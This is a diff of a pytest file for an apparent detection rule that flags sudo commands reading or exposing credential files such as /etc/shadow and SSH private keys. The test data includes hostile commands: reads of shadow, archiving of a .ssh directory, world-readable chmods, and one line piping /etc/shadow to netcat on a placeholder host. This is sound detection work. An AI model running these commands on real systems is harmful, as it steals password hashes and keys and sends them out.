@@ -52,13 +52,48 @@ def test_an_interactive_sudo_read_of_the_hash_file_is_high_in_every_shipper_shap
     ("/usr/bin/grep root /etc/gshadow", "T1003.008"),
     ("/usr/bin/base64 -w0 /etc/shadow-", "T1003.008"),
     ("/bin/dd if=/etc/shadow of=/dev/shm/s", "T1003.008"),
-    ("/bin/tar czf /tmp/k.tgz /home/bob/.ssh", "T1552.004"),
     ("/bin/sh -c cat /etc/shadow | nc 192.0.2.9 4444", "T1003.008"),
     ("/usr/bin/env LANG=C timeout 5 /usr/bin/head -n 3 /etc/shadow", "T1003.008"),
 ])
 def test_reads_of_hash_files_and_private_keys_through_readers_wrappers_and_scripts(command, technique):
     _rule, [m] = judge(sudo(command))
     assert m.proposed_lane == "high" and technique in m.attack
+
+
+@pytest.mark.parametrize("command", [
+    "/usr/bin/tee /etc/sudoers.d/x",                         # a write destination
+    "/usr/bin/install -m 600 k /root/.ssh/id_rsa",
+    "/usr/bin/rsync -a keys/ /root/.ssh/",
+    "/bin/tar xzf b.tgz -C /root/.ssh",
+    "/bin/tar czf /tmp/k.tgz /home/bob/.ssh",                # an archiver may read or write: named, not read
+    "/usr/bin/curl -o /etc/ssl/private/s.key https://pki.example.test/s.key",
+    "/usr/bin/openssl genrsa -out /etc/ssl/private/s.key 2048",
+])
+def test_programs_that_may_write_their_operands_only_name_them_as_leads(command):
+    _rule, [m] = judge(sudo(command))
+    assert m.proposed_lane == "lead" and "a program not known here to read its arguments" in m.claim
+
+
+def test_a_copy_onto_a_key_path_is_a_write_and_never_a_joined_path():
+    _rule, out = judge(sudo("/bin/cp /tmp/a /root/.ssh/id_rsa"))
+    assert out == []
+
+
+def test_two_credential_reads_in_one_command_name_the_other():
+    _rule, [m] = judge(sudo("/usr/bin/cat /etc/shadow /root/.ssh/id_rsa"))
+    assert "also name 1 other credential path(s): ['/root/.ssh/id_rsa']" in m.claim
+
+
+@pytest.mark.parametrize("command, reported", [
+    ("/bin/chmod 644 /etc/shadow", True), ("/bin/chmod o+r /root/.ssh/id_rsa", True), ("/bin/chmod a+rw /etc/gshadow", True),
+    ("/bin/chmod 600 /root/.ssh/id_rsa", False), ("/bin/chmod 640 /etc/shadow", False), ("/bin/chmod g+r /etc/shadow", False),
+    ("/bin/chmod 644 /etc/ssh/ssh_host_rsa_key.pub", False), ("/bin/chmod 644 /etc/sudoers", False),
+])
+def test_making_the_hash_files_or_a_key_world_readable_is_a_lead(command, reported):
+    _rule, out = judge(sudo(command))
+    assert bool(out) is reported
+    if reported:
+        assert out[0].proposed_lane == "lead" and "readable by every account" in out[0].claim
 
 
 def test_a_relative_operand_is_placed_with_the_logged_working_directory():
